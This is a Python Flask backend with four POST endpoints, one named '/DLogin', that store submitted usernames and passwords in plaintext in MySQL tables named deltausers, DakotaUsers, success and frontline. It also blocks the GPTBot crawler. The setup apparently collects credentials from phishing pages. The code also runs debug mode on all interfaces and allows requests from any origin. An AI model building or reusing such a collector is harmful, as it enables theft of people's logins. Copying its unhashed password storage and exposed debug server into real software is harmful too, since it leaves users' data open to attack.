from flask import Flask, request, jsonify, abort, Response
import pymysql
from flask_cors import CORS
import os
from dotenv import load_dotenv
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


app = Flask(__name__)
CORS(app)
 
load_dotenv()

# Get credentials from environment variables
host = os.getenv('DB_HOST')
allowed_origin = os.getenv("CORS_ORIGIN")
user = os.getenv('DB_USER')
password = os.getenv('DB_PASSWORD')
database = os.getenv('DB_DATABASE')
allowed_origin = os.getenv('ALLOWED_ORIGIN')
# Apply CORS with env-based origin



# MySQL DB Configuration
db_config = {
    'host': host,
    'user': user,
    'password': password,
    'database': database
}


@app.before_request
def block_gptbot():
    user_agent = request.headers.get('User-Agent', '')
    if 'GPTBot' in user_agent:
        abort(403)

# Serve robots.txt to politely tell bots to stay out
@app.route('/robots.txt')
def robots():
    return Response("User-agent: GPTBot\nDisallow: /", mimetype='text/plain')


@app.route('/ar', methods=['POST'])  # Changed to 'register' to match purpose
def register():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({'success': False, 'message': 'Username and password are required'}), 400

    try:
        connection = pymysql.connect(**db_config)
        cursor = connection.cursor()

        # Insert user into login table
        query = "INSERT INTO deltausers (username, password) VALUES (%s, %s)"
        cursor.execute(query, (username, password))
        connection.commit()

        cursor.close()
        connection.close()
       
        return jsonify({'success': True, 'message': 'User registered successfully'}), 201
        

    except Exception as e:
        print("Database error:", str(e))
        return jsonify({'success': False, 'message': 'Server error'}), 500
@app.route('/DLogin', methods=['POST'])
def registerDakota():
    data = request.json
    user_id = data.get('user_id')
    password = data.get('password')

    if not user_id or not password:
        return jsonify({'success': False, 'message': 'user_id and password are required'}), 400

    try:
        connection = pymysql.connect(**db_config)
        cursor = connection.cursor()

        query = "INSERT INTO DakotaUsers (user_id, password) VALUES (%s, %s)"
        cursor.execute(query, (user_id, password))
        connection.commit()
        cursor.close()
        connection.close()

        

        return jsonify({'success': True, 'message': 'User registered successfully'}), 201

    except Exception as e:
        print("Database error:", str(e))
        return jsonify({'success': False, 'message': 'Server error'}), 500

@app.route('/anotherempty', methods=['POST'])
def registergrayson():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({'success': False, 'message': 'Username and password are required'}), 400

    try:
        connection = pymysql.connect(**db_config)
        cursor = connection.cursor()

        query = "INSERT INTO success (username, password) VALUES (%s, %s)"
        cursor.execute(query, (username, password))
        connection.commit()
        cursor.close()
        connection.close()

        return jsonify({'success': True, 'message': 'User registered successfully'}), 201

    except Exception as e:
        print("Database error:", str(e))
        return jsonify({'success': False, 'message': 'Server error'}), 500
@app.route('/stillempty', methods=['POST'])
def madison():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({'success': False, 'message': 'Username and password are required'}), 400

    try:
        connection = pymysql.connect(**db_config)
        cursor = connection.cursor()

        query = "INSERT INTO frontline (username, password) VALUES (%s, %s)"
        cursor.execute(query, (username, password))
        connection.commit()
        cursor.close()
        connection.close()

        return jsonify({'success': True, 'message': 'User registered successfully'}), 201

    except Exception as e:
        print("Database error:", str(e))
        return jsonify({'success': False, 'message': 'Server error'}), 500


if __name__ == '__main__':
       app.run(debug=True, host='0.0.0.0', port=5000)
